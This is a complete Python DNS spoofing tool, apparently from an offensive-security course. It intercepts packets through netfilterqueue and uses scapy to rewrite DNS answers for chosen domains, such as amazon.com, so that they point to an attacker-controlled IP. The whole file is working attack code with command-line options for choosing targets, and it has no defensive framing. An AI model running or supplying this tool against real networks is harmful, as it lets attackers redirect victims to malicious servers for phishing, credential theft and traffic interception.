#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import signal
import os
import argparse
import re

from termcolor import colored

domains, IP = [None, None]

def def_handler(sig, frame):
    print(colored("\n[!] Quitting the program...\n", "red"))
    os._exit(1)

signal.signal(signal.SIGINT, def_handler)

def get_arguments():
    argparser = argparse.ArgumentParser(description="DNS Spoofer")
    argparser.add_argument("-d", "--domain", required=True, dest="domain", help="Domain(s) to spoof. (Ex: amazon.com / amazon.com,hack4u.io)")
    argparser.add_argument("-i", "--ip-server", required=True, dest="ip", help="Server IP where the victim will connect. (Ex: 192.168.1.100)")

    args = argparser.parse_args()

    return args.domain, args.ip

def verify():
    if os.getuid():
        print(colored("\n[!] Root privilegues are required.\n", "yellow"))
        os._exit(1)

    match_ip = re.match(r'^([0-9]{1,3}\.){3}[0-9]{1,3}$', IP)
    match_domains = re.match(r'([a-zA-Z0-9.]{1,}),{1,}', domains)
    
    return match_ip and match_domains

def process_packet(packet):
    global domains, IP

    d = domains.split(',')
    d.pop() if d[-1] == '' else d
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        qname_dec = qname.decode()

        for domain in d:
            if domain in qname_dec:

                print(colored(f"\t+) Spoofing domain {qname_dec}", "green"))
                try:
                    answer = scapy.DNSRR(rrname=qname ,rdata=IP)

                    scapy_packet[scapy.DNS].an = answer
                    scapy_packet[scapy.DNS].ancount = 1

                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.UDP].len
                    del scapy_packet[scapy.UDP].chksum

                    packet.set_payload(scapy_packet.build())
                except:
                    pass
    
    packet.accept()

def main():
    global domains, IP

    domains, IP = get_arguments()
    domains = f"{domains},"
    
    isValid = verify()

    if isValid:
        print(colored("\n[+] Capturing DNS Resolutions:\n", "yellow"))

        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
    else:
        print(colored("\n[!] Invalid arguments format.\n", "red"))
        
if __name__ == "__main__":
    main()
